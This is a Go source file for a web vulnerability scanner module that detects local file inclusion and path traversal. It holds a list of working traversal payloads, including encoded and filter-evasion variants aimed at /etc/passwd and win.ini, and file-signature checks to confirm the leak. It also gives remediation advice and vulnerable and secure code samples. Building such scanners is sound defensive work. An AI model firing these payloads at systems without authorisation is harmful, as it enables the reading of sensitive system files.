// Package lfi detects local file inclusion / path traversal vulnerabilities
// by injecting traversal sequences and looking for known file contents.
package lfi

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/SepJs/anubis/pkg/delay"
	"github.com/SepJs/anubis/pkg/scanner"
	"github.com/SepJs/anubis/pkg/utils"
)

type Module struct{}

func New() *Module { return &Module{} }

func (m *Module) Name() string             { return "LFI" }
func (m *Module) Description() string      { return "Local File Inclusion / Path Traversal detection (GET/POST parameters)" }
func (m *Module) Level() scanner.ScanLevel { return scanner.Level2 }

// fileSignatures map unique file content markers to human-readable names
var fileSignatures = []struct {
	pattern string
	file    string
}{
	{"root:x:0:0:", "/etc/passwd (Linux)"},
	{"root:*:0:0:", "/etc/passwd (BSD/macOS)"},
	{"root:!:0:0:", "/etc/passwd (AIX)"},
	{"[fonts]", "win.ini (Windows)"},
	{"; for 16-bit app support", "win.ini (Windows)"},
	{"[extensions]", "win.ini (Windows)"},
}

// traversalPayloads covers classic, filter-evasion and double-encoding variants
var traversalPayloads = []string{
	"../../../../etc/passwd",
	"../../../../../etc/passwd",
	"/etc/passwd",
	"....//....//....//etc/passwd",
	"..%2f..%2f..%2fetc%2fpasswd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	"..%252f..%252f..%252fetc%252fpasswd", // double URL encoding
	"%252e%252e%252fetc%252fpasswd",
	"..\\..\\..\\windows\\win.ini",
	"....\\....\\windows\\win.ini",
	"C:/windows/win.ini",
	"/etc/hosts",
	"../../../../etc/hosts",
}

func (m *Module) Run(cfg scanner.ScanConfig, findings chan<- scanner.Finding) error {
	httpCfg := utils.DefaultHTTPConfig()
	httpCfg.UserAgent = cfg.UserAgent
	httpCfg.Timeout = time.Duration(cfg.Timeout) * time.Second
	httpCfg.RateLimit = 0

	if cfg.SSLBypass {
		httpCfg.SkipVerify = true
	}

	client, err := utils.BuildHTTPClient(httpCfg)
	if err != nil {
		return fmt.Errorf("lfi: build client: %w", err)
	}

	target := utils.NormalizeTarget(cfg.Target)
	params := extractURLParams(target)

	if len(params) == 0 {
		params = []string{"file", "path", "page", "include", "doc", "template", "view", "lang", "dir", "read", "load", "show", "download", "attachment"}
		utils.LogDebug(cfg.Verbose, "lfi: no URL params found, testing common parameter names")
	}

	utils.LogDebug(cfg.Verbose, "lfi: testing %d parameter(s) with %d payloads", len(params), len(traversalPayloads))

	limiter := delay.FromConfig(cfg.RateLimit, cfg.DelayStrategy, cfg.MaxDelayMs)

	for _, param := range params {
		for _, payload := range traversalPayloads {
			statusCode, found := testParam(client, target, param, payload, httpCfg, cfg, findings)
			if cfg.AdaptiveDelay && statusCode > 0 {
				limiter.RecordStatusCode(statusCode)
			}
			if cfg.RateLimit > 0 {
				limiter.Wait()
			}
			if found {
				break // one confirmed finding per parameter is enough
			}
		}
	}

	return nil
}

func testParam(
	client *http.Client,
	targetURL, param, payload string,
	httpCfg utils.HTTPConfig,
	cfg scanner.ScanConfig,
	findings chan<- scanner.Finding,
) (int, bool) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return 0, false
	}

	q := u.Query()
	original := q.Get(param)
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	testURL := u.String()

	resp, err := utils.DoRequest(client, http.MethodGet, testURL, nil, httpCfg)
	if err != nil {
		return 0, false
	}
	defer utils.SafeClose(resp.Body)
	statusCode := resp.StatusCode

	body, err := io.ReadAll(io.LimitReader(resp.Body, 128*1024))
	if err != nil {
		return statusCode, false
	}
	bodyLower := strings.ToLower(string(body))

	for _, sig := range fileSignatures {
		if strings.Contains(bodyLower, strings.ToLower(sig.pattern)) {
			findings <- scanner.Finding{
				ID:          fmt.Sprintf("lfi-%s", param),
				Module:      "LFI",
				Type:        scanner.FindingVulnerability,
				Title:       fmt.Sprintf("Local File Inclusion: %s (%s content returned)", param, sig.file),
				Description: fmt.Sprintf("Parameter %q appears vulnerable to path traversal. The content of %s was returned in the response after injecting traversal sequence: %s", param, sig.file, payload),
				Severity:    scanner.SeverityHigh,
				Confidence:  scanner.ConfidenceConfirmed,
				Endpoint:    targetURL,
				Parameter:   param,
				Method:      "GET",
				Evidence:    fmt.Sprintf("Payload: %s | File content signature: %q", payload, sig.pattern),
				CVSSScore:   7.5,
				OWASPMapping: "A01:2021 – Broken Access Control",
				Remediation: fmt.Sprintf(`Local File Inclusion in parameter %q.

• Never pass user input directly to filesystem APIs (os.ReadFile, include, fopen...).
• Maintain a strict server-side allowlist of accessible files/pages and map the
  parameter to an index (e.g. ?page=3 → pages/3.php), never to a raw path.
• Normalize the resolved path with filepath.Clean and verify it stays inside
  the intended base directory (prefix check against filepath.Base).
• Reject input containing traversal sequences: ../, ..\, %2e%2e, %252e, null bytes.`, param),
				VulnCode: fmt.Sprintf(`// VULNERABLE: user input used as a filesystem path
page := req.FormValue("%s")
data, _ := os.ReadFile("./pages/" + page)`, param),
				SecureCode: fmt.Sprintf(`// SECURE: allowlist mapping + containment check
var allow = map[string]string{"home": "home.html", "about": "about.html"}
name := req.FormValue("%s")
file, ok := allow[name]
if !ok {
	http.Error(w, "not found", http.StatusNotFound)
	return
}
p := filepath.Clean(filepath.Join("./pages", file))
if !strings.HasPrefix(p, filepath.Clean("./pages")+string(os.PathSeparator)) {
	http.Error(w, "forbidden", http.StatusForbidden)
	return
}
data, _ := os.ReadFile(p)`, param),
				References: []string{
					"https://owasp.org/www-community/attacks/Path_Traversal",
					"https://portswigger.net/web-security/file-path-traversal",
				},
				DiscoveredAt: time.Now(),
			}
			return statusCode, true
		}
	}

	return statusCode, false
}

func extractURLParams(rawURL string) []string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	var params []string
	for k := range u.Query() {
		params = append(params, k)
	}
	return params
}
